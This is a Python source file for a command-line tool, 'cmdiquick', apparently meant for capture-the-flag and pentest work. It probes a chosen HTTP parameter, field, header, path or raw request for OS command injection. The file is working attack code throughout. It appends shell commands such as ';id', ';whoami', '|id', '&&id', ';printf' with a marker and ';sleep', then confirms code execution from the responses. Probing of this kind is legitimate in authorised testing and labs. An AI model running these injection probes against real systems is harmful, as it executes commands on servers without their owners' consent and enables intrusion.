#!/usr/bin/env python3
"""cmdiquick.py — bounded, transport-independent OS command-injection fast track.

Start from one known-valid request and one explicit injection location. Supported
locations are URL query parameters, URL-encoded form fields, nested JSON fields,
path markers, headers, and a marker inside a raw HTTP request. Raw mode preserves
multipart bodies and also covers cookies, unusual encodings, and filenames.

The default chain is response-only and non-destructive: baseline, ``;id``, then
``;whoami`` after strong POSIX identity output. A paired random-marker control and
small separator fallback handle reflection and alternate shell contexts. Blind
time testing is available only when explicitly requested.

Exit codes: 0 confirmed injection or flag, 2 inconclusive/rate limited/budget,
3 gateway or request failure, 4 invalid arguments.
"""
import argparse
import copy
import json
import os
from pathlib import Path
import random
import re
import string
import sys
import time
from urllib.parse import parse_qsl, quote, urlencode, urljoin, urlsplit, urlunsplit

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}', re.I)
ID_RE = re.compile(r'\buid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)', re.I)
SHELL_ERROR_RE = re.compile(
    r'(?:^|[\r\n"\'])\s*(?:/bin/)?(?:ba|da|a|z|k)?sh:\s|command not found|'
    r'not recognized as an internal or external command|syntax error near unexpected token', re.I)
GATEWAY_FAILURES = {502, 503, 504}
SENSITIVE_HEADERS = {"authorization", "cookie", "proxy-authorization", "x-api-key"}


class FoundFlag(RuntimeError):
    pass


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


def parse_header(item):
    if ":" not in item:
        raise ValueError("--header must be 'Name: Value': %s" % item)
    key, value = item.split(":", 1)
    key = key.strip()
    if not key:
        raise ValueError("empty header name")
    return key, value.strip()


def field_parts(path):
    """Parse ``a.b[0].c`` and ``a.0.c`` into dictionary/list traversal parts."""
    if not path or path.startswith(".") or path.endswith("."):
        raise ValueError("invalid field path: %s" % path)
    parts = []
    for token in path.split("."):
        if not token:
            raise ValueError("invalid field path: %s" % path)
        cursor = 0
        head = re.match(r'[^\[\]]+', token)
        if head:
            value = head.group(0)
            parts.append(int(value) if value.isdigit() else value)
            cursor = head.end()
        while cursor < len(token):
            match = re.match(r'\[(\d+)\]', token[cursor:])
            if not match:
                raise ValueError("invalid field path: %s" % path)
            parts.append(int(match.group(1)))
            cursor += match.end()
    return parts


def nested_get(data, parts):
    current = data
    for part in parts:
        if isinstance(part, int):
            if not isinstance(current, list) or part >= len(current):
                raise ValueError("JSON field path does not exist")
        elif not isinstance(current, dict) or part not in current:
            raise ValueError("JSON field path does not exist")
        current = current[part]
    return current


def nested_set(data, parts, value):
    current = data
    for part in parts[:-1]:
        current = current[part]
    current[parts[-1]] = value


def response_scan(response):
    return (response.text or "") + "\n" + "\n".join(
        "%s: %s" % item for item in response.headers.items())


def redacted_headers(headers):
    return {key: ("<redacted>" if key.lower() in SENSITIVE_HEADERS else value)
            for key, value in headers.items()}


class RequestTemplate:
    def __init__(self, args):
        self.args = args
        self.base_headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
        }
        if args.token:
            self.base_headers["Authorization"] = "Bearer " + args.token
        if args.cookie:
            self.base_headers["Cookie"] = args.cookie
        for item in args.header:
            key, value = parse_header(item)
            self.base_headers[key] = value

        selectors = [bool(args.param), bool(args.field), bool(args.path_marker),
                     bool(args.inject_header), bool(args.request_file)]
        if sum(selectors) != 1:
            raise ValueError(
                "choose exactly one target: --param, --field, --path-marker, "
                "--inject-header, or --request-file")

        body_modes = [args.json_data is not None, args.form is not None]
        if sum(body_modes) > 1:
            raise ValueError("--json/--data and --form are mutually exclusive")
        if args.field and not any(body_modes):
            raise ValueError("--field requires --json/--data or --form")
        if any(body_modes) and not args.field:
            raise ValueError("body input requires --field")
        if args.request_file and any(body_modes):
            raise ValueError("--request-file cannot be combined with --json/--data or --form")

        self.mode = None
        self.seed = args.seed
        self.location = ""
        self.json_data = None
        self.form_pairs = None
        self.json_parts = None
        self.raw_text = None

        if args.request_file:
            self.mode = "raw"
            if not args.marker or args.seed is None:
                raise ValueError("--request-file requires --marker and --seed")
            self.raw_text = Path(args.request_file).read_bytes().decode("latin-1")
            if self.raw_text.count(args.marker) != 1:
                raise ValueError("raw request marker must occur exactly once")
            self.location = "raw:%s" % args.marker
        elif args.param:
            self.mode = "query"
            parsed = urlsplit(args.url)
            pairs = parse_qsl(parsed.query, keep_blank_values=True)
            matches = [value for key, value in pairs if key == args.param]
            if len(matches) != 1:
                raise ValueError("--param must name exactly one existing query parameter")
            self.seed = matches[0]
            self.location = "query:%s" % args.param
        elif args.path_marker:
            self.mode = "path"
            if args.url.count(args.path_marker) != 1 or args.seed is None:
                raise ValueError("--path-marker must occur once in --url and requires --seed")
            self.location = "path:%s" % args.path_marker
        elif args.inject_header:
            self.mode = "header"
            matches = [(key, value) for key, value in self.base_headers.items()
                       if key.lower() == args.inject_header.lower()]
            if len(matches) != 1:
                raise ValueError("--inject-header must name one existing --header")
            self.header_key, self.seed = matches[0]
            self.location = "header:%s" % self.header_key
        elif args.json_data is not None:
            self.mode = "json"
            self.json_data = json.loads(args.json_data)
            if not isinstance(self.json_data, (dict, list)):
                raise ValueError("--json/--data must decode to an object or array")
            self.json_parts = field_parts(args.field)
            self.seed = nested_get(self.json_data, self.json_parts)
            self.location = "json:%s" % args.field
        elif args.form is not None:
            self.mode = "form"
            self.form_pairs = parse_qsl(args.form, keep_blank_values=True)
            matches = [value for key, value in self.form_pairs if key == args.field]
            if len(matches) != 1:
                raise ValueError("--field must name exactly one form field")
            self.seed = matches[0]
            self.location = "form:%s" % args.field

        if not isinstance(self.seed, str):
            raise ValueError("the selected baseline value must be a string")

    def _raw_request(self, value):
        rendered = self.raw_text.replace(self.args.marker, value)
        head, separator, body = rendered.partition("\r\n\r\n")
        if not separator:
            head, separator, body = rendered.partition("\n\n")
        lines = head.replace("\r\n", "\n").split("\n")
        request_line = lines.pop(0).split()
        if len(request_line) < 2:
            raise ValueError("invalid raw request line")
        method, target = request_line[:2]
        url = target if target.startswith(("http://", "https://")) else urljoin(self.args.url, target)
        headers = {}
        for line in lines:
            if not line:
                continue
            key, header_value = parse_header(line)
            if key.lower() not in ("host", "content-length", "transfer-encoding"):
                headers[key] = header_value
        headers.update(self.base_headers)
        return method.upper(), url, headers, {"data": body.encode("latin-1")}

    def build(self, value):
        headers = dict(self.base_headers)
        method = self.args.method
        url = self.args.url
        kwargs = {}
        if self.mode == "raw":
            method, url, headers, kwargs = self._raw_request(value)
        elif self.mode == "query":
            parsed = urlsplit(url)
            pairs = parse_qsl(parsed.query, keep_blank_values=True)
            pairs = [(key, value if key == self.args.param else old) for key, old in pairs]
            url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
                              urlencode(pairs, doseq=True), parsed.fragment))
        elif self.mode == "path":
            encoded = quote(value, safe=";&|$(),'\"")
            url = url.replace(self.args.path_marker, encoded)
        elif self.mode == "header":
            headers[self.header_key] = value
        elif self.mode == "json":
            payload = copy.deepcopy(self.json_data)
            nested_set(payload, self.json_parts, value)
            headers.setdefault("Content-Type", "application/json")
            kwargs["json"] = payload
        elif self.mode == "form":
            pairs = [(key, value if key == self.args.field else old)
                     for key, old in self.form_pairs]
            headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
            kwargs["data"] = pairs
        return method, url, headers, kwargs


class CommandInjectionFastTrack:
    def __init__(self, args, template):
        self.args = args
        self.template = template
        self.session = requests.Session()
        self.count = 0
        self.confirmed = False
        self.possible_shell_error = False
        os.makedirs(args.out, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")

    def _record(self, label, value, request, response=None, error=None, elapsed=None):
        method, url, headers, kwargs = request
        body = kwargs.get("json", kwargs.get("data"))
        if isinstance(body, bytes):
            body = body.decode("latin-1", "replace")
        record = {
            "label": label,
            "location": self.template.location,
            "mutation": value,
            "request": {
                "method": method, "url": url,
                "headers": redacted_headers(headers), "body": body,
            },
        }
        if error is not None:
            record["error"] = repr(error)
        else:
            record.update({
                "status": response.status_code,
                "elapsed": elapsed,
                "response_headers": dict(response.headers),
                "response_body": (response.text or "")[:8000],
            })
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")

    def send(self, label, value):
        if self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        request = self.template.build(value)
        method, url, headers, kwargs = request
        started = time.monotonic()
        try:
            response = self.session.request(
                method, url, headers=headers, timeout=self.args.timeout,
                allow_redirects=False, verify=False, **kwargs)
        except requests.RequestException as exc:
            elapsed = time.monotonic() - started
            self._record(label, value, request, error=exc, elapsed=elapsed)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        elapsed = time.monotonic() - started
        self._record(label, value, request, response=response, elapsed=elapsed)
        print("[%02d/%02d] %-24s HTTP %d %db %.3fs" % (
            self.count, self.args.max_probes, label,
            response.status_code, len(response.content), elapsed))
        scan = response_scan(response)
        hits = unique(FLAG_RE.findall(scan))
        if hits:
            for hit in hits:
                print("FLAG %s" % hit)
            raise FoundFlag()
        if response.status_code == 429:
            raise Inconclusive("429 rate limit during %s" % label)
        if response.status_code in GATEWAY_FAILURES:
            raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        return response, elapsed

    def identity_proof(self, label, payload, baseline_scan):
        response, _ = self.send(label, payload)
        scan = response_scan(response)
        if ID_RE.search(scan) and not ID_RE.search(baseline_scan):
            self.confirmed = True
            print("INJECTABLE %s via %s (new uid/gid output)" % (
                self.template.location, label))
            return True
        if SHELL_ERROR_RE.search(scan) and not SHELL_ERROR_RE.search(baseline_scan):
            self.possible_shell_error = True
            print("[?] new shell/process error during %s" % label)
        return False

    def marker_proof(self, baseline_scan):
        nonce = "CMDIQ_" + "".join(random.choice(string.ascii_uppercase + string.digits)
                                    for _ in range(12))
        literal = self.template.seed + nonce
        literal_response, _ = self.send("reflection-control", literal)
        literal_scan = response_scan(literal_response)
        variants = []
        if self.args.os in ("auto", "posix"):
            variants.append(("posix-marker", self.template.seed + ";printf " + nonce))
        if self.args.os in ("auto", "windows"):
            variants.append(("windows-marker", self.template.seed + "&echo " + nonce))
        for label, payload in variants:
            response, _ = self.send(label, payload)
            scan = response_scan(response)
            if nonce in scan and nonce not in baseline_scan and nonce not in literal_scan:
                self.confirmed = True
                print("INJECTABLE %s via %s (execution-only marker)" % (
                    self.template.location, label))
                return True
            if SHELL_ERROR_RE.search(scan) and not SHELL_ERROR_RE.search(baseline_scan):
                self.possible_shell_error = True
        return False

    def blind_time_proof(self):
        seconds = self.args.blind_time
        controls = []
        delays = []
        for index in range(2):
            _, elapsed = self.send("timing-control-%d" % (index + 1), self.template.seed)
            controls.append(elapsed)
        if self.args.os == "windows":
            payload = self.template.seed + "&timeout /t %d" % seconds
        else:
            payload = self.template.seed + ";sleep %d" % seconds
        for index in range(2):
            _, elapsed = self.send("timing-probe-%d" % (index + 1), payload)
            delays.append(elapsed)
        margin = min(delays) - max(controls)
        if margin >= seconds * 0.65:
            self.confirmed = True
            print("INJECTABLE %s via paired timing differential %.3fs" % (
                self.template.location, margin))
            return True
        print("[-] no repeatable timing differential (margin %.3fs)" % margin)
        return False

    def run(self):
        baseline, _ = self.send("baseline", self.template.seed)
        if not 200 <= baseline.status_code < 300:
            raise Inconclusive(
                "known-valid baseline did not succeed (HTTP %d); fix the request before probing"
                % baseline.status_code)
        baseline_scan = response_scan(baseline)

        if self.args.os in ("auto", "posix"):
            if self.identity_proof("posix-id", self.template.seed + ";id", baseline_scan):
                self.send("posix-whoami", self.template.seed + ";whoami")
                return

        if self.marker_proof(baseline_scan):
            suffix = "&whoami" if self.args.os == "windows" else ";whoami"
            self.send("whoami", self.template.seed + suffix)
            return

        fallbacks = []
        if self.args.os in ("auto", "posix"):
            fallbacks.extend([
                ("posix-and-id", self.template.seed + "&&id"),
                ("posix-pipe-id", self.template.seed + "|id"),
                ("posix-or-id", self.template.seed + "||id"),
            ])
        for label, payload in fallbacks:
            if self.identity_proof(label, payload, baseline_scan):
                self.send("posix-whoami", self.template.seed + ";whoami")
                return

        if self.args.blind_time:
            self.blind_time_proof()
            if self.confirmed:
                return

        detail = "; new shell/process errors were observed" if self.possible_shell_error else ""
        raise Inconclusive("no strong command-execution differential%s" % detail)


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Probe one explicit request location for OS command injection")
    parser.add_argument("--url", required=True,
                        help="endpoint URL, or origin URL with --request-file")
    parser.add_argument("--method", choices=("GET", "POST", "PUT", "PATCH", "DELETE"),
                        help="request method; inferred as POST for body modes, otherwise GET")
    body = parser.add_mutually_exclusive_group()
    body.add_argument("--json", "--data", dest="json_data",
                      help="known-valid JSON request body")
    body.add_argument("--form", help="known-valid application/x-www-form-urlencoded body")
    parser.add_argument("--field", help="JSON path or form field to mutate")
    parser.add_argument("--param", help="existing URL query parameter to mutate")
    parser.add_argument("--path-marker", help="single marker in --url to replace")
    parser.add_argument("--inject-header", help="existing --header name to mutate")
    parser.add_argument("--request-file", help="raw HTTP request containing --marker once")
    parser.add_argument("--marker", help="raw-request marker replaced by each value")
    parser.add_argument("--seed", help="valid baseline for path/raw marker modes")
    parser.add_argument("--token", help="Bearer token")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--header", action="append", default=[], help="extra 'Name: Value' header")
    parser.add_argument("--os", choices=("auto", "posix", "windows"), default="auto")
    parser.add_argument("--blind-time", type=int, metavar="SECONDS",
                        help="explicit paired time-delay probe; recommended value 2-5")
    parser.add_argument("--out", default="recon/cmdiquick", help="evidence directory")
    parser.add_argument("--max-probes", type=int, default=12)
    parser.add_argument("--delay", type=float, default=0.15)
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args(argv)
    if args.method is None:
        args.method = "POST" if args.json_data is not None or args.form is not None else "GET"
    return args


def main(argv=None):
    runner = None
    try:
        args = parse_args(argv)
        if args.max_probes < 1:
            raise ValueError("--max-probes must be positive")
        if args.delay < 0 or args.timeout <= 0:
            raise ValueError("--delay must be non-negative and --timeout positive")
        if args.blind_time is not None and not 1 <= args.blind_time <= 10:
            raise ValueError("--blind-time must be between 1 and 10 seconds")
        template = RequestTemplate(args)
        runner = CommandInjectionFastTrack(args, template)
        runner.run()
        print("[*] confirmed after %d probe(s); evidence: %s" % (
            runner.count, runner.log_path))
        return 0
    except FoundFlag:
        print("[*] stopped on flag after %d probe(s); evidence: %s" % (
            runner.count, runner.log_path))
        return 0
    except (Inconclusive, BudgetExhausted) as exc:
        count = runner.count if runner else 0
        evidence = runner.log_path if runner else "not created"
        print("[!] INCONCLUSIVE after %d probe(s): %s; evidence: %s" % (
            count, exc, evidence))
        return 2
    except CircuitBreak as exc:
        count = runner.count if runner else 0
        evidence = runner.log_path if runner else "not created"
        print("[!] CIRCUIT BREAKER after %d probe(s): %s; evidence: %s" % (
            count, exc, evidence))
        return 3
    except (OSError, ValueError, TypeError, json.JSONDecodeError) as exc:
        print("[!] invalid arguments: %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
